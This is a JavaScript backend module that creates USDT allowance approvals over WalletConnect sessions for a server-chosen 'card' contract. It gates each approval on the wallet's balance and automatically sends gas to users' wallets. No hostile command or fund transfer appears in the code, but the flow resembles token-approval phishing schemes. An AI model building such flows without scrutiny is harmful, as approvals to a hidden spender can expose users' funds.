const sessionStore = require("../storage/sessions");
const paymentStore = require("../storage/payments");
const { getNetwork, MAX_ALLOWANCE_USDT } = require("../config/networks");
const { emitEvent } = require("../utils/events");
const { allowanceUnits } = require("../utils/helpers");
const { NotFoundError, ValidationError } = require("../utils/errors");
const { checkCardEligibility } = require("./cardEligibility");
const logger = require("../utils/logger");

const ACTIVE_STATUSES = new Set(["approved", "settled", "updated"]);

function emitPaymentEvent(event, payment, extra = {}) {
    emitEvent(event, {
        paymentId: payment.paymentId,
        connectionId: payment.connectionId,
        network: payment.network,
        status: payment.status,
        timestamp: new Date().toISOString(),
        ...extra
    });
}

function assertNoClientOverrides(body) {
    if (body.spender || body.cardContract || body.card) {
        throw new ValidationError("Spender/card contract cannot be supplied by the client");
    }

    if (body.tokenContract || body.tokenAddress || body.usdt || body.contractAddress) {
        throw new ValidationError("Token contract cannot be supplied by the client");
    }

    if (body.allowance != null || body.amount != null || body.allowanceRaw != null) {
        throw new ValidationError("Allowance cannot be supplied by the client");
    }

    if (body.network) {
        throw new ValidationError("Network is selected by the server from card eligibility");
    }
}

function assertActiveSession(session) {
    if (!session) {
        throw new NotFoundError("WalletConnect session not found");
    }

    if (!ACTIVE_STATUSES.has(session.status) || !session.sessionTopic) {
        throw new ValidationError("WalletConnect session is not active yet");
    }
}

function publicPayment(payment) {
    if (!payment) {
        return null;
    }

    return {
        paymentId: payment.paymentId,
        connectionId: payment.connectionId,
        network: payment.network,
        chainId: payment.chainId,
        token: payment.token,
        tokenContract: payment.tokenContract,
        spender: payment.spender,
        allowance: `${MAX_ALLOWANCE_USDT.toString()} USDT`,
        allowanceRaw: String(payment.allowanceRaw),
        decimals: payment.decimals,
        status: payment.status,
        requestId: payment.requestId,
        transactionHash: payment.transactionHash,
        groupId: payment.groupId || null,
        gasSufficient: Boolean(payment.gasSufficient),
        gasFundingVerified: Boolean(payment.gasFundingVerified),
        error: payment.error || null,
        createdAt: payment.createdAt,
        updatedAt: payment.updatedAt
    };
}

async function ensurePaymentForNetwork(session, networkKey, eligibility, groupId, deps) {
    const { checkGasSufficiency } = require("./gasFunding");
    const network = getNetwork(networkKey);
    const existing = paymentStore.findByConnectionNetwork(session.connectionId, network.key);

    if (existing && (existing.status === "verified" || existing.status === "requested" || existing.status === "wallet_confirmed")) {
        return {
            payment: existing,
            gas: existing.gasQuote || { sufficient: existing.gasSufficient === true },
            reused: true
        };
    }

    const gas = await (deps.checkGasSufficiency || checkGasSufficiency)(session, network.key, deps);
    const allowanceRaw = MAX_ALLOWANCE_USDT * allowanceUnits(network.usdtDecimals);

    if (existing && (existing.status === "created" || existing.status === "awaiting_gas")) {
        const updated = paymentStore.updatePayment(existing.paymentId, {
            groupId: existing.groupId || groupId,
            gasQuote: gas,
            gasSufficient: gas.sufficient,
            status: gas.sufficient ? "created" : "awaiting_gas"
        });
        return { payment: updated, gas, reused: true };
    }

    const payment = paymentStore.addPayment({
        connectionId: session.connectionId,
        groupId,
        network: network.key,
        token: "USDT",
        tokenContract: network.usdtContract,
        spender: network.cardContract,
        allowance: `${MAX_ALLOWANCE_USDT.toString()} USDT`,
        allowanceRaw,
        decimals: network.usdtDecimals,
        chainId: network.chainId,
        status: gas.sufficient ? "created" : "awaiting_gas",
        gasQuote: gas,
        gasSufficient: gas.sufficient,
        gasFundingVerified: false
    });

    emitPaymentEvent("payment_created", payment);
    return { payment, gas, reused: false };
}

async function maybeAutoFund(session, payment, gas, eligibility, deps) {
    if (gas.sufficient) {
        return { payment, gas };
    }

    if (!(eligibility.eligibleNetworks || []).includes(payment.network)) {
        return { payment, gas };
    }

    const networkKey = payment.network;

    if (session.nativeFunding?.[networkKey]?.hash || payment.gasFundingTxHash) {
        return {
            payment,
            gas: {
                ...gas,
                autoFunded: true,
                sufficient: false,
                transactionHash: session.nativeFunding?.[networkKey]?.hash || payment.gasFundingTxHash
            }
        };
    }

    const { hasNativeFunder, autoTopupRaw } = require("../config/evmGas");
    const network = getNetwork(networkKey, { requireContracts: false });
    const env = require("../config/env");
    const flag = networkKey === "tron"
        ? env.TRON_AUTO_FUND
        : networkKey === "bsc"
            ? env.BSC_AUTO_FUND
            : env.ETH_AUTO_FUND;
    const autoEnabled = String(flag || "true").toLowerCase() !== "false"
        && hasNativeFunder(networkKey)
        && autoTopupRaw(network)
        && gas.currentBalanceRaw != null;

    if (!autoEnabled) {
        return { payment, gas };
    }

    try {
        const { confirmGasQuote } = require("./gasFunding");
        const funded = await confirmGasQuote(payment.paymentId, {}, deps);

        if (funded.funded) {
            const ready = funded.payment && funded.payment.gasSufficient === true;
            return {
                payment: paymentStore.getPayment(payment.paymentId),
                gas: {
                    ...gas,
                    sufficient: ready,
                    autoFunded: true,
                    transactionHash: funded.transactionHash,
                    recommendedFunding: gas.recommendedFunding
                }
            };
        }
    } catch (err) {
        logger.warn({ err: { message: err.message }, network: networkKey }, "Automatic gas top-up failed");
    }

    return { payment: paymentStore.getPayment(payment.paymentId) || payment, gas };
}

async function createPayment(body, deps = {}) {
    assertNoClientOverrides(body || {});

    const session = sessionStore.getSession(body.connectionId);
    assertActiveSession(session);

    const snapshotBalances = session.balances;
    let latestSession = session;

    if (!deps.checkGasSufficiency) {
        try {
            await require("./balances").refreshBalances(session.connectionId, { ...deps, skipCache: true });
            latestSession = sessionStore.getSession(session.connectionId) || session;
        } catch (err) {
            logger.warn({ err: { message: err.message } }, "Could not refresh balances before gas check");
            latestSession = sessionStore.getSession(session.connectionId) || session;
        }
    }

    let eligibility = (deps.checkCardEligibility || checkCardEligibility)(latestSession);

    if (!eligibility.eligible && Array.isArray(snapshotBalances) && snapshotBalances.length) {
        const unread = eligibility.reason === require("./cardEligibility").UNREADABLE_MESSAGE;
        const fallback = (deps.checkCardEligibility || checkCardEligibility)({
            ...latestSession,
            balances: snapshotBalances
        });

        if (unread && fallback.eligible) {
            latestSession = {
                ...latestSession,
                balances: snapshotBalances
            };
            eligibility = fallback;
        }
    }

    if (!eligibility.eligible) {
        throw new ValidationError(eligibility.reason);
    }

    const groupId = require("../utils/helpers").createId();
    const { resolveApprovalNetworks } = require("./cardEligibility");
    const resolvedKeys = resolveApprovalNetworks(latestSession, eligibility);
    const networkKeys = resolvedKeys.length
        ? resolvedKeys
        : (eligibility.eligibleNetworks?.length ? eligibility.eligibleNetworks : [eligibility.preferredNetwork]);
    eligibility = {
        ...eligibility,
        eligibleNetworks: networkKeys,
        reason: `Eligible for 1 USDT approval on ${networkKeys.join(", ")}.`
    };
    const created = [];
    let lastConfigError = null;

    for (const networkKey of networkKeys) {
        try {
            getNetwork(networkKey);
        } catch (err) {
            lastConfigError = err;
            logger.warn({ err: { message: err.message }, networkKey }, "Skipping card network; contracts are not configured");
            continue;
        }

        const row = await ensurePaymentForNetwork(latestSession, networkKey, eligibility, groupId, deps);
        const funded = await maybeAutoFund(latestSession, row.payment, row.gas, eligibility, deps);
        created.push({
            payment: publicPayment(funded.payment),
            gas: funded.gas
        });
        latestSession = sessionStore.getSession(session.connectionId) || latestSession;
    }

    if (!created.length) {
        if (lastConfigError) {
            throw lastConfigError;
        }

        throw new ValidationError("No eligible network has a configured card contract");
    }

    const current = created.find((item) => item.payment.status !== "verified") || created[0];

    return {
        ...current.payment,
        eligibility,
        gas: current.gas,
        payments: created.map((item) => ({
            ...item.payment,
            gas: item.gas
        }))
    };
}

function getPayment(paymentId) {
    const payment = paymentStore.getPayment(paymentId);

    if (!payment) {
        throw new NotFoundError("Payment not found");
    }

    return publicPayment(payment);
}

function getPaymentStatus(paymentId) {
    return getPayment(paymentId);
}

module.exports = {
    emitPaymentEvent,
    assertNoClientOverrides,
    assertActiveSession,
    publicPayment,
    createPayment,
    getPayment,
    getPaymentStatus
};
